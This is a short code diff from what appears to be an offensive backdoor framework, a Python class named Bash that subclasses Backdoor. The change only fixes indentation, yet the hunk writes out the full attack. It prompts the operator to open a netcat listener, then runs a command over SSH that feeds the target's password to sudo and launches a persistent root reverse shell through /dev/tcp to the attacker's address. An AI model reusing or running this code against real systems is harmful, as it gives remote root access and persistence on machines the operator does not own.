@@ -30,7 +30,7 @@ class Bash(Backdoor):
         port = self.get_value("port")
 
         print(GOOD + "Initializing backdoor...")
-	raw_input("Please create a listener with the command nc -v -n -l -p " + str(port))
-	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % port)
+        raw_input("Please create a listener with the command nc -v -n -l -p " + str(port))
+        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % port)
         print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + self.target.pword)
 
